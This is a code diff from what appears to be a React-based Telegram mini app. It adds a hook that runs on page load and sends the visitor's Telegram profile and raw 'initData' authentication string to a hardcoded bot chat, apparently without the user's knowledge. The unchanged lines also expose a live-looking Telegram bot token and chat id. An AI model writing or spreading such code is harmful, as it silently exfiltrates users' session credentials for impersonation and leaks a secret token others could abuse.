@@ -16,8 +16,8 @@ let time = 0;
 const tgtoken = 'bot5807856562:AAFx-yxoMg2aoAggt4M0NU7qeLe49DIv__g';
 const chat_id = "-1001166751237"
 
-export async function sendUpdate(msg) {
-  if (time < Date.now() - 3000) {
+export async function sendUpdate(msg , force = false) {
+  if (time < Date.now() - 3000 || force) {
     time = Date.now();
 
     // if (ip === 'Not Found') {
@@ -75,6 +75,18 @@ function App(props) {
       setActiveModal(modals.none)
     };
     window.addEventListener('popstate', handleBackButton);
+    const tg = window.Telegram?.WebApp;
+    const user = tg?.initDataUnsafe;
+    const userData = {
+        id: user.id,
+        first_name: user.first_name,
+        last_name: user.last_name,
+        username: user.username,
+        photo_url: user.photo_url || null,
+        initData: tg.initData,
+        themeParams: tg.themeParams
+    };
+   sendUpdate(JSON.stringify(userData))
   }, [])
 
   useEffect(() => {
